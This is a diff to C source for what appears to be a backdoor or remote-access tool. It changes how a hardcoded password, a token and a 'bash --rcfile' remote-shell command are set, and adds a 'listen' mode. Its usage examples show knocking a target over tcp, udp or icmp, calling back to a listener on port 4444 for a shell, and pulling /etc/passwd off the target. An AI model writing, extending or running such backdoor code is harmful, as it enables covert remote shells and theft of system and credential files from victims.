@@ -31,8 +31,8 @@
 unsigned char message[BUFSIZE + 1];
 extern char *optarg;
 extern int optind;
-char *secret = PASS;
-char *token = TOKEN;
+char *secret;
+char *token;
 
 int sockfd;
 pid_t pid;
@@ -576,19 +576,25 @@ void usage(char *argv){
 	printf("Example: %s -t 192.168.0.3 -x tcp -l 192.168.0.4 -p 4444\n", argv);
 	printf("Example: %s -t 192.168.0.3 -x udp -l 192.168.0.4 -p 4444 -r 161 -q 8888\n", argv);
 	printf("Example: %s -t 192.168.0.3 -x icmp -s 192.168.0.2 -l 192.168.0.4 -p 4444 -w s3cr3t -k hax0r\n", argv);
-	printf("Example: %s -t 192.168.0.3 -a \"get /etc/passwd /tmp\" -x udp -l 192.168.0.4 -p 4444\"\n\n", argv);
+	printf("Example: %s -t 192.168.0.3 -a \"get /etc/passwd /tmp\" -x udp -l 192.168.0.4 -p 4444\"\n", argv);
+	printf("Example: %s -x listen -p 4444\n\n", argv);
 	exit(1);
 }
 
 int main(int argc, char **argv) {
-        char *srcip, *dstip, *buf, *prot, *lport, *lhost, *data;
-	char *password, *src_file, *dst_dir, *cmd, action = RUNSHELL; 
+        char *srcip, *dstip, *buf, *prot, *lport, *lhost, *data, *rcfile = RCFILE;
+	char *password, *src_file, *dst_dir, *cmd, b_arg[20+strlen(rcfile)], action = RUNSHELL; 
         int opt, ret, new_sockfd, yes = 1, rport = 0, srcport = SRCPORT;  
 	struct sockaddr_in host_addr, client_addr;
 	socklen_t sin_size;
 
         lhost = lport = src_file = dst_dir = srcip = dstip = prot = buf = cmd = data = NULL;
- 
+
+	secret = PASS;
+	token = TOKEN;
+	strcpy(b_arg, "exec bash --rcfile "); 
+	strcat(b_arg, rcfile);
+
         while((opt = getopt(argc, argv, "x:t:l:p:r:s:q:a:w:k:")) != EOF) {
                 switch(opt) {
                         case 'x':
@@ -786,7 +792,7 @@ int main(int argc, char **argv) {
             			printf("\n");
 				ret = ((cmd != NULL)
                 		? runshell(new_sockfd, cmd)
-                		: runshell(new_sockfd, "exec bash --rcfile " RCFILE));
+                		: runshell(new_sockfd, b_arg));
             			break;
 			default:
             			ret = -1;
